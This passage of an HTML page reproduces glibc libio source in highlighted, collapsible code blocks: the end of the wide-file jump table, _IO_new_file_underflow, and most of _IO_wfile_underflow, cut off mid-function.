  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_wfile_seekoff</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="n">_IO_new_file_setbuf</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">)</span> <span class="n">_IO_wfile_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_wfile_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="n">_IO_default_showmanyc</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="n">_IO_default_imbue</span><span class="p">)</span>
<span class="p">};</span>
<span class="n">libc_hidden_data_def</span> <span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/fileops.c:_IO_new_file_underflow</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>

  <span class="cm">/* C99 requires EOF to be "sticky".  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="cm">/* This is very tricky. We have to adjust those
     pointers before we call _IO_SYSREAD () since
     we may longjump () out while waiting for
     input. Those pointers may be screwed up. H.J. */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
	 handles.  As a result, our offset cache would no longer be valid, so
	 unset it.  */</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">)</span>
</code></pre></div>    </div>
  </div>
</details>

<details>
<summary>libio/wfileops.c:_IO_wfile_underflow</summary>
<div>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">wint_t</span>
<span class="nf">_IO_wfile_underflow</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">cd</span><span class="p">;</span>
  <span class="k">enum</span> <span class="n">__codecvt_result</span> <span class="n">status</span><span class="p">;</span>
  <span class="kt">ssize_t</span> <span class="n">count</span><span class="p">;</span>

  <span class="cm">/* C99 requires EOF to be "sticky".  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

  <span class="n">cd</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_codecvt</span><span class="p">;</span>

  <span class="cm">/* Maybe there is something left in the external buffer.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* There is more in the external.  Convert it.  */</span>
      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_stop</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_last_state</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
      <span class="n">status</span> <span class="o">=</span> <span class="n">__libio_codecvt_in</span> <span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
				   <span class="o">&amp;</span><span class="n">read_stop</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span>
				   <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
				   <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">read_stop</span><span class="p">;</span>

      <span class="cm">/* If we managed to generate some text return the next character.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
	<span class="k">return</span> <span class="o">*</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">status</span> <span class="o">==</span> <span class="n">__codecvt_error</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
	  <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
	<span class="p">}</span>

      <span class="cm">/* Move the remaining content of the read buffer to the beginning.  */</span>
      <span class="n">memmove</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">,</span>
	       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">);</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span>
			  <span class="o">+</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">));</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">else</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="n">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* We used to flush all line-buffered stream.  This really isn't
	 required by any standard.  My recollection is that
	 traditional Unix systems did this for stdout.  stderr better
	 not be line buffered.  So we do just that here
	 explicitly.  --drepper */</span>
      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>

      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>

  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">read_ptr_copy</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">accbuf</span><span class="p">[</span><span class="n">MB_LEN_MAX</span><span class="p">];</span>
  <span class="kt">size_t</span> <span class="n">naccbuf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
 <span class="nl">again:</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">naccbuf</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">else</span>
	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
	<span class="cm">/* There are some bytes in the external buffer but they don't
	   convert to anything.  */</span>
	<span class="n">__set_errno</span> <span class="p">(</span><span class="n">EILSEQ</span><span class="p">);</span>
      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>

  <span class="cm">/* Now convert the read input.  */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_last_state</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">from</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
  <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">to</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">to_copy</span> <span class="o">=</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">naccbuf</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">to_copy</span> <span class="o">=</span> <span class="n">MIN</span> <span class="p">(</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">accbuf</span><span class="p">)</span> <span class="o">-</span> <span class="n">naccbuf</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
      <span class="n">to</span> <span class="o">=</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">accbuf</span><span class="p">[</span><span class="n">naccbuf</span><span class="p">],</span> <span class="n">from</span><span class="p">,</span> <span class="n">to_copy</span><span class="p">);</span>
      <span class="n">naccbuf</span> <span class="o">+=</span> <span class="n">to_copy</span><span class="p">;</span>
      <span class="n">from</span> <span class="o">=</span> <span class="n">accbuf</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">status</span> <span class="o">=</span> <span class="n">__libio_codecvt_in</span> <span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">,</span>
			       <span class="n">from</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">read_ptr_copy</span><span class="p">,</span>
			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span>
			       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">,</span>
			       <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">);</span>

